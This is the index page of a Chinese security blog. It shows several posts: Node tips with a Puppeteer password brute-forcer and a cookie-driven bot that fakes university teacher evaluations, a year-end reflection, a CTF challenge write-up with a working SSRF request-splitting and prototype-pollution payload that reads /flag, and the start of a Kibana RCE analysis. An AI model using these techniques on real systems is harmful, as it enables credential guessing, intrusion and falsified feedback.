<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
        <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <title>
        
            Hpdoger
        
    </title>
    <link rel="icon" href="/img/favicon.png">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="/css/font-awesome.min.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <link rel="stylesheet" href="/css/hljs.min.css">
    <script src="/js/hljs.min.js"></script>  
    <script src="/js/gitment.browser.js"></script>  
</head>
<body>
    <header class="header" id="header">
    <h1>
        <a class="title" href="/">
            Hpdoger
        </a>
    </h1>
    <h2>
        <a class="motto">
            Finance behind Passion in Security
        </a>
    </h2>
    <nav class="navbar">
        <ul class="menu">
            
            
                <li class="menu-item">
                    <a href="/" class="menu-item-link">
                        Home
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/archives/" class="menu-item-link">
                        Archives
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/about/" class="menu-item-link">
                        About
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/friends/" class="menu-item-link">
                        Friends
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
                        Github
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/atom.xml" class="menu-item-link">
                        RSS
                    </a>
                </li>
            
                
            
                
                
        </ul>
    </nav>
</header>
    <main class="main">
        <section class="posts">
    
        <article class="post">
            <h1>
                <a class="title" href="/2025/01/03/Node的一些应用技巧(持续更新)/"> 
                    Node的一些应用技巧(持续更新) 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2025-01-03   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端安全/">前端安全</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="Node的一些应用技巧-持续更新"><a href="#Node的一些应用技巧-持续更新" class="headerlink" title="Node的一些应用技巧(持续更新)"></a>Node的一些应用技巧(持续更新)</h1><p>一边学一边记吧..一些能用的到的</p>
<h2 id="puppeteer模拟登陆"><a href="#puppeteer模拟登陆" class="headerlink" title="puppeteer模拟登陆"></a>puppeteer模拟登陆</h2><p>对于表单加密，可以简单的用Pupputeer来模拟登陆，遇到前端加密的情况直接爆破密码。同样能够模拟爬虫，比webdriver要省事的多，而且支持document.queryselector，完全模拟浏览器操作</p>
<pre><code>const puppeteer = require(&#39;puppeteer&#39;);

async function autoLogin(url,username,password){
    const browser = await puppeteer.launch({
        args: [ &#39;--proxy-server=http://127.0.0.1:8080&#39; ],
        headless: false
    });
    const page = await browser.newPage();

    for(var i=0, len=password.length; i&lt;len; i++){
        pwd = password[i];
        await page.goto(url);
        await page.waitForSelector(&#39;#login&#39;);
        await page.type(&#39;#username&#39;, username,{ delay: 50 });
        await page.type(&#39;#password&#39;, pwd,{ delay: 50 });

        await page.click(&#39;#btn_click&#39;);

        await page.waitFor(200);
        let html = await page.content();
        if(html.indexOf(&#39;wrong&#39;) &lt; 1){
            break
        }
    }

    // const tokenVal = await page.$eval(&#39;#token&#39;, input =&gt; input.value);
    await browser.close();
    // console.log(&quot;[*]got token is:&quot;+tokenVal);

    page.on(&#39;error&#39;,(err)=&gt;{
        console.log(err)
    });
}

var username = &#39;admin&#39;;
var password = [&#39;password&#39;,&#39;root&#39;,&#39;sa&#39;,&#39;admin&#39;,&#39;admin123&#39;]

autoLogin(&#39;http://node.localhost.com/koa-demo/aes.html&#39;,username,password);</code></pre><h2 id="http发送请求"><a href="#http发送请求" class="headerlink" title="http发送请求"></a>http发送请求</h2><h3 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h3><p>对比python-request的优点在于不造成阻塞</p>
<pre><code>function getack(target){
    return new Promise((resolve,reject)=&gt;{
        let options = {
            url: target,
            headers: {
                &#39;User-Agent&#39;: &#39;request&#39;
            }
        };
        request.get(options, (error,response,body)=&gt;{
            if (!error &amp;&amp; response.statusCode == 200) { 
                resolve(body);
            }else{
                reject(error);
            }
        }).on(&#39;error&#39;, function(err) {
            rehect(err);
        }); 
    })

}

var target = &#39;http://server.com&#39;;

getack(target).then((body)=&gt;{
    console.log(body);
})</code></pre><h3 id="携带cookie请求"><a href="#携带cookie请求" class="headerlink" title="携带cookie请求"></a>携带cookie请求</h3><p>request默认不带cookie请求，需要启动jar，获取一个jar对象带入options中，同时对其进行setCookie操作</p>
<pre><code>const j = request.jar();
const cookie1 = request.cookie(&#39;username=admin&#39;);
const cookie2 = request.cookie(&#39;userid=123&#39;);
j.setCookie(cookie1, target);
j.setCookie(cookie2, target);

let options = {
    url: target,
    jar:j,
    headers: {
        &#39;User-Agent&#39;: &#39;request&#39;
    }
};

request.get(options, (error,response,body)=&gt;{
    if (!error &amp;&amp; response.statusCode == 200) { 
        resolve(body);
    }else{
        reject(error);
    }
}).on(&#39;error&#39;, function(err) {
    reject(err);
}); </code></pre><h3 id="Response内置属性-方法"><a href="#Response内置属性-方法" class="headerlink" title="Response内置属性/方法"></a>Response内置属性/方法</h3><p>查看http.ServerResponse类属性和方法:<a href="http://nodejs.cn/api/http.html#http_class_http_serverresponse" target="_blank" rel="noopener">http://nodejs.cn/api/http.html#http_class_http_serverresponse</a></p>
<h2 id="HTTP-Server"><a href="#HTTP-Server" class="headerlink" title="HTTP-Server"></a>HTTP-Server</h2><h3 id="快速搭建"><a href="#快速搭建" class="headerlink" title="快速搭建"></a>快速搭建</h3><p>Nodejs提供了内置的http-api，用来作为Server很方便，console出来便于收藏poc</p>
<pre><code>//server.js
var http=require(&quot;http&quot;);

http.createServer(function(req,res){
    res.writeHead(200,{
        &quot;content-type&quot;:&quot;text/plain&quot;
    });
    res.write(&quot;hello world&quot;);
    console.log(req.url)
    res.end();

}).listen(3000);

console.log(&quot;[*]server run on:http://127.0.0.1:3000&quot;)</code></pre><h3 id="设置Cookie"><a href="#设置Cookie" class="headerlink" title="设置Cookie"></a>设置Cookie</h3><p><code>req.headers.cookie</code>获取请求头的cookie。node中原生http通过setHeader设置cookie，<code>response.setHeader(name, value)</code>方法接收key,value键值对。</p>
<pre><code>http.createServer(function(req,res){
    username = &#39;admin&#39;
    userid = 1
    res.setHeader(&quot;Set-Cookie&quot;,[`username=${username}`,`userid=${userid}`]);
    res.writeHead(200,{
        &quot;content-type&quot;:&quot;text/plain&quot;
    });
    console.log(req.url);
    res.end(&#39;hello world&#39;);

}).listen(3000);</code></pre><p>当然也可以用JS-Cookie来操作cookie</p>
<h2 id="调试Express框架"><a href="#调试Express框架" class="headerlink" title="调试Express框架"></a>调试Express框架</h2><h3 id="调试已启动的Node程序"><a href="#调试已启动的Node程序" class="headerlink" title="调试已启动的Node程序"></a>调试已启动的Node程序</h3><p>在 launch.json 中作如下配置，VSCODE添加配置选项可自动添加</p>
<pre><code>{
    // 使用 IntelliSense 了解相关属性。 
    // 悬停以查看现有属性的描述。
    // 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387
    &quot;version&quot;: &quot;0.2.0&quot;,
    &quot;configurations&quot;: [
        {
            &quot;type&quot;: &quot;node&quot;,
            &quot;request&quot;: &quot;attach&quot;,
            &quot;name&quot;: &quot;Attach by Process ID&quot;,
            &quot;processId&quot;: &quot;${command:PickProcess}&quot;,
            &quot;skipFiles&quot;: [
                &quot;&lt;node_internals&gt;/**&quot;
            ]
        }
    ]
}</code></pre><p>启动调试之后会让你选择存在的进程号来指定调试程序<br><img src="http://static.zybuluo.com/1160307775/s15ml8tunt28esr8pao6rhfe/image_1dtsvrmsu4ij1hjp1abliqe1nh2m.png" alt="image_1dtsvrmsu4ij1hjp1abliqe1nh2m.png-116.6kB"></p>
<h3 id="断点位置"><a href="#断点位置" class="headerlink" title="断点位置"></a>断点位置</h3><p>Express基于中间键，调试的时候很难找到入口。如果你跟中间键的话，它在加载框架时要加载一堆的中间键(query、inint、session、cookie)这些的很复杂。所以建议直接把断点打在路由中间件<code>Route</code>的dispatch方法上，因为dispacth就是分发路由，转到对应的实现方法<br><img src="http://static.zybuluo.com/1160307775/pyj1xnf4na3lvkmf4nj84hk2/image_1dtses96u3m212l3rk713h615lr9.png" alt="image_1dtses96u3m212l3rk713h615lr9.png-359.5kB"></p>
<p>如果你想对中间键进行分析的话，建议把断点打在这里，因为只是进入中间键的第一步，fn是一个回调的函数<br><img src="http://static.zybuluo.com/1160307775/iz3ez5c6rlrlllaipylotxfq/image_1dtsfb8ds4ebel43qt60o1rk99.png" alt="image_1dtsfb8ds4ebel43qt60o1rk99.png-366.2kB"></p>
<h3 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h3><p>关于express中间键的加载以及路由的调度，<strong>强烈建议</strong>看这篇文章<a href="https://shadowwood.me/2016/08/27/2016-08-27-express-origin-code-analysis/" target="_blank" rel="noopener">express源码分析</a></p>
<h2 id="应用实例1-某信息工程大学全自动评教"><a href="#应用实例1-某信息工程大学全自动评教" class="headerlink" title="应用实例1-某信息工程大学全自动评教"></a>应用实例1-某信息工程大学全自动评教</h2><p>由于贵校老师实在太多了，闲来无事写了个自动评教(默认全好评)。之所以写了一个koa，是因为最初我想挂到机房，同学们拿着cookie在我web端傻瓜式自动评教了。后来我发现贵校的sso的session竟然验证了ip，代码放出来。</p>
<pre><code>const puppeteer = require(&#39;puppeteer&#39;);
const Koa = require(&#39;koa&#39;);
const router = require(&#39;koa-router&#39;);
const bodyParser = require(&#39;koa-bodyparser&#39;);

const app = new Koa()
const home  = new router()

async function autoFound(url,cookie){
        const browser = await puppeteer.launch({
            headless: false
        });
        const page = await browser.newPage();
        page.on(&#39;dialog&#39;,(dialog)=&gt;{
            console.log(dialog.message());
            dialog.accept(&quot;确定&quot;);
        });

        page.on(&#39;error&#39;,(err)=&gt;{
            console.log(err);
        });

        const cookies = [{
            name: &#39;semester.id&#39;,
            value: &#39;105&#39;,
            domain: &#39;210.41.225.2&#39;
            },{
            name: &#39;JSESSIONID&#39;,
            value: cookie,
            domain: &#39;210.41.225.2&#39;
            },{
            name: &#39;GSESSIONID&#39;,
            value: cookie,
            domain: &#39;210.41.225.2&#39;
            }];

        await page.setCookie(...cookies);

        await page.goto(url);
        const result = await page.evaluate(() =&gt; {
            var list = [...document.querySelectorAll(&#39;td &gt; a&#39;)]
            return list.map(el =&gt; {
                return {
                url: el.href.trim(),
                name: el.innerText
                }
            })
        })

        var answers = [&#39;老师真好，我很喜欢跟他相处&#39;,&#39;老师工作认真负责，课后问题及时讲解&#39;,&#39;在老师的课堂上学到很多知识&#39;];

        for(var i=0, len=result.length;i&lt;len;i++){
            let bufurl = result[i][&quot;url&quot;];
            try{
                await page.goto(bufurl);
                await page.waitForSelector(&#39;.option-item&#39;);
                await page.click(&quot;input[id=option_425_0]&quot;);
                await page.click(&quot;input[id=option_426_0]&quot;);
                await page.click(&quot;input[id=option_427_0]&quot;);
                await page.click(&quot;input[id=option_428_0]&quot;);
                await page.click(&quot;input[id=option_429_0]&quot;);
                await page.click(&quot;input[id=option_430_0]&quot;);
                await page.click(&quot;input[id=option_431_0]&quot;);
                await page.click(&quot;input[id=option_432_0]&quot;);
                await page.click(&quot;input[id=option_433_0]&quot;);
                await page.click(&quot;input[id=option_434_0]&quot;);
                await page.click(&quot;input[id=option_435_0]&quot;);
                await page.click(&quot;input[id=option_436_0]&quot;);
                await page.click(&quot;input[id=option_437_4]&quot;);
                await page.click(&quot;input[id=option_438_3]&quot;);
                await page.click(&quot;input[id=option_439_0]&quot;);
                await page.click(&quot;input[id=option_440_0]&quot;);
                await page.type(&#39;.answer-textarea&#39;, answers[i%3],{ delay: 50 });
                await page.click(&#39;#sub&#39;);
                await page.waitFor(3000);
                console.log(result[i][&#39;name&#39;]+&quot;done!&quot;);
            }catch(err){
                try{
                    await page.goto(bufurl);
                    await page.waitForSelector(&#39;.option-item&#39;);
                    await page.click(&quot;input[id=option_382_0]&quot;);
                    await page.click(&quot;input[id=option_383_0]&quot;);
                    await page.click(&quot;input[id=option_384_0]&quot;);
                    await page.click(&quot;input[id=option_385_0]&quot;);
                    await page.click(&quot;input[id=option_386_0]&quot;);
                    await page.click(&quot;input[id=option_387_0]&quot;);
                    await page.click(&quot;input[id=option_388_0]&quot;);
                    await page.click(&quot;input[id=option_389_0]&quot;);
                    await page.click(&quot;input[id=option_390_0]&quot;);
                    await page.click(&quot;input[id=option_391_0]&quot;);
                    await page.click(&quot;input[id=option_392_0]&quot;);
                    await page.click(&quot;input[id=option_393_0]&quot;);
                    await page.click(&quot;input[id=option_502_4]&quot;);
                    await page.click(&quot;input[id=option_395_3]&quot;);
                    await page.click(&quot;input[id=option_396_0]&quot;);
                    await page.click(&quot;input[id=option_397_0]&quot;);
                    await page.type(&#39;.answer-textarea&#39;, answers[i%3],{ delay: 50 });
                    await page.click(&#39;#sub&#39;);
                    await page.waitFor(3000);
                    console.log(result[i][&#39;name&#39;]+&quot;done!&quot;);
                }catch(err){
                    await page.goto(bufurl);
                    await page.waitForSelector(&#39;.option-item&#39;);
                    await page.click(&quot;input[id=option_414_0]&quot;);
                    await page.click(&quot;input[id=option_415_0]&quot;);
                    await page.click(&quot;input[id=option_416_0]&quot;);
                    await page.click(&quot;input[id=option_417_0]&quot;);
                    await page.click(&quot;input[id=option_418_0]&quot;);
                    await page.click(&quot;input[id=option_419_0]&quot;);
                    await page.click(&quot;input[id=option_420_0]&quot;);
                    await page.click(&quot;input[id=option_421_0]&quot;);
                    await page.click(&quot;input[id=option_422_0]&quot;);
                    await page.click(&quot;input[id=option_423_0]&quot;);
                    await page.click(&quot;input[id=option_424_0]&quot;);
                    await page.type(&#39;.answer-textarea&#39;, answers[i%3],{ delay: 50 });
                    await page.click(&#39;#sub&#39;);
                    await page.waitFor(3000);
                    console.log(result[i][&#39;name&#39;]+&quot;done!&quot;);
                }
            }
        }
        await browser.close();
}

home.get(&#39;/&#39;,async(ctx)=&gt;{
    let html = `
    &lt;html&gt;
    &lt;body&gt;
    &lt;p&gt;
        首先登陆jwc.cuit.edu.cn，&quot;量化评教&quot;的学情自己填了(否则不允许评教)
    &lt;/p&gt;
    &lt;p&gt;
        然后浏览器f12控制台输入document.cookie，例如:
    &lt;/p&gt;

    &lt;p&gt;
        GSESSIONID=B8209EC9AF980BDFE89CF0C43C356DC8
    &lt;/p&gt;

    &lt;p&gt; 
        则把B8209EC9AF980BDFE89CF0C43C356DC8复制到框内提交
    &lt;/p&gt;
    &lt;form action=&quot;evaluate&quot; method=&quot;post&quot;&gt;
        &lt;input type=&quot;text&quot; id=&quot;cookie&quot; name=&quot;Mycookie&quot;&gt;
        &lt;input type=&quot;submit&quot; id=&quot;btn_click&quot; name=&quot;submit&quot;/&gt;
    &lt;/form&gt;
    &lt;/body&gt;

    &lt;/html&gt;`
    ctx.body = html

})

home.post(&#39;/evaluate&#39;,async(ctx)=&gt;{
    cookie = ctx.request.body.Mycookie;
    ctx.body = &quot;[+]waiting..后台正在帮您自动评教..请一分钟以后刷新jwc查看情况...&quot;;
    console.log(cookie);
    autoFound(&#39;http://210.41.225.2/eams/quality/stdEvaluate.action&#39;,cookie);
})

app.use(bodyParser())
app.use(home.routes()).use(home.allowedMethods());
app.listen(3000)
console.log(&#39;[demo] start-quick is starting at port 3000&#39;)</code></pre><p>如果想改变对老师的印象可自行更改以下内容</p>
<pre><code>[&#39;老师真好，我很喜欢跟他相处&#39;,&#39;老师工作认真负责，课后问题及时讲解&#39;,&#39;在老师的课堂上学到很多知识&#39;]</code></pre>
                
            </div>
            <div class="continue">
            <a href="/2025/01/03/Node的一些应用技巧(持续更新)/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2020/01/01/My 2019/"> 
                    My 2019 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2020-01-01   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/博客文章/">博客文章</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="My-2019"><a href="#My-2019" class="headerlink" title="My 2019"></a>My 2019</h1><p>9102年的最后一天，按照国际惯例还是要记录一下。</p>
<p>从18年底到现在，大大小小的flag立了无数，自己都忘记完成了些什么，又有多少计划搁浅了。2019年最遗憾的是懒狗的本质还是没有改掉。</p>
<p>记得18年的这个时候我给自己定了个标签叫”蜕变”。因为18年是我大学入门安全的第一年，从一知半解到求知的过程像是破茧成蝶，充满坎坷但是有股奋斗的劲头。</p>
<p>然而，我想了很久也没能找到合适的词汇来描述19这一年，绞尽脑汁也没想起来今年都做过哪些有意义的事。无论是天南海北的打比赛、还是去学着挖洞，都比不上18年那股热情。好在当初立下的flag还是完成了一些，勉强也算是在技术上有一些进步，那干脆19年就叫”自定义”好了。</p>
<p>“自定义”了些什么呢？挖洞/审计/CTF？感觉每样都沾边，但是每样又没做到很好。懒狗的毛病又被无限化放大，干啥都是三分钟热度。举个例子来说：当初说要好好挖SRC，结果自动化的工具写了几天就去玩儿了，亦或者被其他琐事缠身(搬砖)，没有持之以恒。有位大师傅说得好，搞安全、挖漏洞，讲求的不光是门路多、思路广，还要学会坐得住、坐得稳。也希望自己来年可以学会如何<strong>专心</strong></p>
<p>记录一下2019年自己小赚人生第一桶金吧，虽然挣的确实不多，而且也特别累。上半年入手了自己的mbp，下半年猪肉涨价全用来吃饭了。可能是信安这个行业在今年突然变火的原因吧，还是搬了一些小砖，也浪费了不少时间。下半年以后太懒了也就不做这些了，主要原因还是想去多学点东西。通过hw或者一些其他项目对信安这个专业有了一些收入的认知。只要live as a tool man，还是能取得不错的薪资，但这必不可能是我们的归途。我是永远觉得金钱&lt;&lt;热情，希望自己在未来能够有能力说出这句话。</p>
<p>未来的一年要备战考研，博客大概率会长草，打算趁着寒假还有时间就多发几篇</p>
<p>20，继续做那个有点理想的普通人。</p>
<p>最后，祝这个世界依旧热闹，祝我仍是我。</p>

                
            </div>
            <div class="continue">
            <a href="/2020/01/01/My 2019/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/12/01/I-SOON2019-Membershop出题思路/"> 
                    I-SOON2019-Membershop出题思路 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-12-01   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/小组-学校/">小组/学校</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>今年是第二年出题，鉴于去年题目过于简单(去年我是真的sb且敷衍)，今年题目我憋了蛮长时间的(狗日的前端)，本希望做到这题的师傅们能有所收获。但是比赛跟各位师傅的时间还是冲突了，加之校赛的局限，实际也没多少人在打。比赛当天下午，Membershop容器的峰值也就5、6个的样子。其实题目并不是很难。</p>
<p>虽然最后没能达到自己预期的做题效果，算是有点点失望吧。但是我相信D0g3一定能把比赛办出去，感谢运维小哥@0akarma跟我一起调试动态容器的bug，关于全部的题目环境在:<a href="http://dao.ge/isoon2019" target="_blank" rel="noopener">http://dao.ge/isoon2019</a></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>题目开源地址:<a href="https://github.com/Hpd0ger/My_ctf_challenge/" target="_blank" rel="noopener">https://github.com/Hpd0ger/My_ctf_challenge/</a></p>
<p>修改index.js的server_ip为环境的ip</p>
<pre><code>docker-compose build
docker-compose up -d</code></pre><h1 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h1><p>登陆的时候过滤了admin，同时发现小写字符转换成了大写字母显示。结合set-cookie是koa的框架，很容易联想到后端使用<code>toUpperCase()</code>做转换，拉丁文越权登陆<code>admın</code></p>
<p><img src="http://static.zybuluo.com/1160307775/uevaveqvu1j6y2trkxfhf08u/image_1dr12lu22vs4iq44id1vuas21m.png" alt="image_1dr12lu22vs4iq44id1vuas21m.png-38.1kB"></p>
<p>登陆成功之后多了一个请求记录的功能，同时登陆成功后给出源码的地址</p>
<p><img src="http://static.zybuluo.com/1160307775/vmsnv0pzmurxdz2amugpr9br/image_1dr12phlo1hc31vqi17fvahuhgr16.png" alt="image_1dr12phlo1hc31vqi17fvahuhgr16.png-48.1kB"></p>
<p>拿到源码后简单看登陆逻辑<br><img src="http://static.zybuluo.com/1160307775/w044ik52f2r0v4qy9dztwfc2/image_1dmbk6vlo19d413cc13h8b108q913.png" alt="image_1dmbk6vlo19d413cc13h8b108q913.png-57.7kB"></p>
<p>逻辑根据传入的用户名<code>userName</code>会在登陆前经过一次检测<br><img src="http://static.zybuluo.com/1160307775/1sn9fw27548pjpjy0yfishg4/image_1dmbk45jltj28kro9c1kjdkshm.png" alt="image_1dmbk45jltj28kro9c1kjdkshm.png-65.8kB"></p>
<p>当传入的用户名包含<code>admin</code>时，则自动循环replace掉。在登陆成功的同时会把<code>username</code>写进session里，这里可以看到只有我们登陆了<code>admin</code>才有权限加载其他模版<br><img src="http://static.zybuluo.com/1160307775/8rvxorv0r9e3u03r6vjzyo2u/image_1dmbkcg89ijlmd61vef209bti1g.png" alt="image_1dmbkcg89ijlmd61vef209bti1g.png-160.3kB"></p>
<p>漏洞点在代码76-117行，它只允许请求以<code>http://127.0.0.1:3000/query</code>(后面拉到本地环境会改127.0.0.1这个地址，这是我本地debug)开头的url。输入其他开头的url会被<code>error url</code>，而且不存在任何host的绕过。当请求之后会被记录在sandbox的results.txt里面并且支持追加，sandbox根据ip建立<br><img src="http://static.zybuluo.com/1160307775/1fkgcdl7j1qc7v6dcjf6tdxm/image_1dmbkrtpt1pkv1q561o9kf2p10hj2n.png" alt="image_1dmbkrtpt1pkv1q561o9kf2p10hj2n.png-28.9kB"><br><img src="http://static.zybuluo.com/1160307775/sl6ii6qt9zm6mj7jrfhsetsp/image_1dmbku3fk399n211cvq49r1emt34.png" alt="image_1dmbku3fk399n211cvq49r1emt34.png-33.7kB"></p>
<p>因为query也是一个路由，那么这里就存在一个ssrf。如何bypass去请求其他路由呢？只需要用unicode编码并且分割http包，例如</p>
<pre><code>http://127.0.0.1:3000/query?param=1\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1:3000\u{010D}\u{010A}Connection:\u{0120}keep-alive\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0173}\u{0161}\u{0176}\u{0165}</code></pre><p>url编码是16进制，\u{01xx}在http.get的时候不会进行percent encode，但是在buffer写入的时候会把xx解码。其中<code>\u{0173}\u{0161}\u{0176}\u{0165}</code>代表的是<code>save</code>，73617665是<code>save</code>的16进制表示。具体原理可以看:<a href="https://www.4hou.com/vulnerable/13637.html" target="_blank" rel="noopener">通过拆分请求来实现的SSRF攻击</a></p>
<p>接着就寻找一下其他路由存在的问题，可利用点在<code>/save</code></p>
<pre><code>home.get(&#39;/save&#39;,async(ctx)=&gt;{
    let ip = ctx.request.ip;
    let reqbody = {switch:false}
    reqbody = qs.parse(ctx.querystring,{allowPrototypes: false});

    if (ip.substr(0, 7) == &quot;::ffff:&quot;) {
        ip = ip.substr(7);
    }
    if (ip !== &#39;127.0.0.1&#39; &amp;&amp; ip !== server_ip) {
        ctx.status = 403;
        ctx.response.body = &#39;403: You are not the local user&#39;;
    }else {
        if(reqbody.switch === true &amp;&amp; reqbody.sandbox &amp;&amp; reqbody.opath &amp;&amp;fs.existsSync(reqbody.spath)){
            if(fs.existsSync(reqbody.sandbox)){
                paths.opath = fs.readdirSync(reqbody.sandbox)[0];
            }else if(fs.existsSync(reqbody.opath)){
                let buffer;
                tmp[reqbody.sandbox][&#39;opath&#39;] = reqbody.opath;
                if(/[flag]/.test(tmp[reqbody.sandbox][&#39;opath&#39;])){
                    buffer = tmp[reqbody.sandbox][&#39;opath&#39;].replace(/f|l|a|g/g,&#39;&#39;);
                }else{
                    buffer = reqbody.opath;
                }
            }
            let opath = paths.opath? paths.opath : buffer;
            let text = fs.readFileSync(opath, &#39;utf8&#39;);
            await WriteResults(reqbody.spath,text);

        }else{
            return false;
        }
    }
})</code></pre><p>这里大致有两个障碍点：</p>
<p>1、限制了本地127.0.0.1访问<br>-&gt;ssrf解决</p>
<p>2、通过qs包解析url参数存为对象，switch默认为flase，配置<code>allowPrototypes=false</code>，直接传递http参数不能覆盖switch。qs.parse() bypass for prototype pollution@qs&lt;6.3，参考链接:<a href="https://snyk.io/vuln/npm:qs:20170213" target="_blank" rel="noopener">Prototype Override Protection Bypass</a>，传参:<code>]=switch</code>绕过</p>
<p>3、解析获得的对象需要三个参数sandbox、opath、spath。代码逻辑就是如果存在sandbox那么就取sandbox下的第一个文件(即results.txt)读取后写入spath，否则读取自定义的opath，将结果写入spath(两者前提都是spath必须存在且可写，只有sandbox/result.txt满足要求)。但是自定义opath会替换所有的[flag]字段，不允许直接读flag。</p>
<p>这里存在判断的绕过。原型链污染sandbox下的一个文件为/flag，再去自定义读到spath里</p>
<pre><code>tmp[&#39;__proto__&#39;][&#39;opath&#39;] = &#39;/flag&#39;;
=&gt;
paths.opath = /flag</code></pre><p>构造一下就能把flag追加写入到sandbox/results.txt。poc如下，调整一下opath为flag地址，sandbox为自己的<code>md5(ip)</code>就行了：</p>
<pre><code>encodeURI(&quot;http://127.0.0.1:3000/query?param=1\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1:3000\u{010D}\u{010A}Connection:\u{0120}keep-alive\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0173}\u{0161}\u{0176}\u{0165}?]=switch&amp;sandbox=__proto__&amp;opath=/flag&amp;spath=tmp/ab54a5cf83f67d827ecba68e394f9196&quot;)</code></pre>
                
            </div>
            <div class="continue">
            <a href="/2019/12/01/I-SOON2019-Membershop出题思路/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/11/20/从Kibana-RCE对nodejs子进程创建的思考/"> 
                    从Kibana-RCE对nodejs子进程创建的思考 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-11-20   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端安全/">前端安全</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="从Kibana-RCE对nodejs子进程创建的思考"><a href="#从Kibana-RCE对nodejs子进程创建的思考" class="headerlink" title="从Kibana-RCE对nodejs子进程创建的思考"></a>从Kibana-RCE对nodejs子进程创建的思考</h1><p>在前几天Kibana有一则关于原型链污染+子进程调用=&gt;rce的漏洞，跟进分析的时候发现child_process实现子进程创建确实存在trick。于是有了下文是对child_process的实现和Kibana RCE的一点思考。</p>
<h1 id="child-process建立子进程的实现"><a href="#child-process建立子进程的实现" class="headerlink" title="child_process建立子进程的实现"></a>child_process建立子进程的实现</h1><p>对于child_process大家应该都不陌生，它是nodejs内置模块，用于新建子进程，在CTF题目中也常使用<code>require(&#39;child_process&#39;).exec(&#39;xxx&#39;)</code>来RCE。</p>
<p>child_process内置了6个方法:execFileSync、execSync、fork、exec、execFile、spawn()</p>
<p>其中execFileSync()调用spawnSync()，execSync()调用spawnSync()，而spawnSync()调用spawn();exec()调用execFile()，而execFile()调用spawn();fork()调用spawn()。也就是说前6个方法最终都是调用spawn()，而spawn()的本质是创建ChildProcess的实例并返回。那我们直接对spawn这个方法进行分析</p>
<p>测试代码:</p>
<pre><code>const { spawn } = require(&#39;child_process&#39;);

spawn(&#39;whoami&#39;).stdout.on(&#39;data&#39;, (data) =&gt; {
    console.log(`stdout: ${data}`);
  });</code></pre><p>Node使用模块<code>child_process</code>建立子进程时，调用<code>用户层面的spawn</code>方法。初始化子进程的参数，进入方法<code>normalizeSpawnArguments</code></p>
<pre><code>var spawn = exports.spawn = function(/*file, args, options*/) {
  var opts = normalizeSpawnArguments.apply(null, arguments);
};</code></pre><p>跟进方法<code>normalizeSpawnArguments</code>，当options不存在时将options命为空对象。接着到下面最关键的一步，即获取env变量的方式。首先对options.env是否存在做了判断，如果options.env为undefined则将环境变量<code>process.env</code>的值复制给env。而后对envParivs这个数组进行push操作，其实就是env变量对应的键值对。</p>
<pre><code>function normalizeSpawnArguments(file, args, options) {
    ...//省略
  if (options === undefined)
    options = {};

    ...//省略
  var env = options.env || process.env;
  var envPairs = [];

  for (var key in env) {
    envPairs.push(key + &#39;=&#39; + env[key]);
  }

  _convertCustomFds(options);

  return {
    file: file,
    args: args,
    options: options,
    envPairs: envPairs
  };
}</code></pre><p><img src="http://static.zybuluo.com/1160307775/70133nyslwwm715le1gimvfi/image_1dpddlch71nmr1v2g1jgs1guv18nj2a.png" alt="image_1dpddlch71nmr1v2g1jgs1guv18nj2a.png-386.4kB"></p>
